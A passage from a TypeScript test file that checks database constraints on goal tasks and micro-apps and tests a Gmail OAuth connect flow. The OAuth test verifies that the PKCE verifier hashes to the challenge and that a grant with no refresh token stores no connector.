  await assert.rejects(rt.db.prepare(`INSERT INTO goal_tasks (task_id, goal_id, seq_no, kind, spec_json, status) VALUES ('t_x', 'goal_mig2', 1, 'code_gen', '{}', 'DONE')`).run(), /constraint/i);
  await rt.db.prepare(`INSERT INTO micro_apps (app_id, household_id, goal_id, slug, title, bundle_r2_key, manifest_json, status, created_at) VALUES ('app_mig2', ?, 'goal_mig2', 'mig-two', 't', 'k', '{}', 'STAGED', ?)`).bind(h.household_id, at).run();
  await assert.rejects(rt.db.prepare(`UPDATE micro_apps SET monthly_ai_calls_used = -1 WHERE app_id = 'app_mig2'`).run(), /constraint/i);
  await assert.rejects(rt.db.prepare(`UPDATE micro_apps SET monthly_ai_calls_cap = -1 WHERE app_id = 'app_mig2'`).run(), /constraint/i);
});

test('GMAIL (more): the PKCE verifier is sent and hashes to the challenge; a grant with no refresh token stores nothing', async () => {
  const h = await makeHousehold(rt.db);
  const { env } = (await import('./helpers/m2')).testEnv(rt, { ENABLE_GMAIL_OAUTH: 'true' });
  const g = newGoogle();
  g.scope = _GS;
  const spy: string[] = [];
  const inner = fakeGoogle(g);
  const net = createGuardedFetch({ db: rt.db, fetchImpl: (async (input: RequestInfo | URL, init?: RequestInit) => {
    if (typeof init?.body === 'string') spy.push(init.body);
    return inner(input, init);
  }) as typeof fetch, ttlMs: 0 });
  const connect = await authed(env, '/api/auth/google/gmail-connect', h, net);
  const loc = new URL(connect.headers.get('location')!);
  const cookie = connect.headers.get('set-cookie')!.split(';')[0]!;
  const ok = await authed(env, `/api/auth/google/gmail-callback?code=good-code&state=${loc.searchParams.get('state')}`, null, net, { cookie });
  assert.equal(ok.status, 302);
  const form = new URLSearchParams(spy.at(-1)!);
  const verifier = form.get('code_verifier')!;
  assert.ok(verifier.length >= 43);
  const challenge = Buffer.from(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier))).toString('base64url');
  assert.equal(challenge, loc.searchParams.get('code_challenge'));
  assert.notEqual(verifier, loc.searchParams.get('code_challenge'));
  assert.deepEqual([form.get('grant_type'), form.get('redirect_uri')], ['authorization_code', `${APP_ORIGIN}/api/auth/google/gmail-callback`]);

  const h2 = await makeHousehold(rt.db);
  g.omitRefreshToken = true;
  const c2 = await authed(env, '/api/auth/google/gmail-connect', h2, net);
  const bad = await authed(env, `/api/auth/google/gmail-callback?code=good-code&state=${new URL(c2.headers.get('location')!).searchParams.get('state')}`, null, net, { cookie: c2.headers.get('set-cookie')!.split(';')[0]! });
  assert.equal(bad.status, 502);
  assert.equal(await findGmailConnector(rt.db, h2.household_id), null);
});
